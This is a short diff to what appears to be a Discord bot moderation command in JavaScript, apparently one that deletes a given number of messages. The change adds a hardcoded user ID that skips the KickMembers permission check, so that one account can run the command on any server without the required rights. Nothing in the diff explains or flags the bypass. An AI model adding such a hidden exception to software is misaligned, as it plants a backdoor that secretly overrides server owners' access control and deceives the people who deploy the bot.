@@ -17,8 +17,11 @@ module.exports = {
 
 
         if (!userPermissions.has(PermissionsBitField.Flags.KickMembers)) {
-            await interaction.reply({content: "You do not have permission to use this command!", ephemeral: true});
-            return;
+
+            if (interaction.user.id !== "729567972070391848") {
+                await interaction.reply({content: "You do not have permission to use this command!", ephemeral: true});
+                return;
+            }
         }
 
         const amount = interaction.options.getInteger('amount');
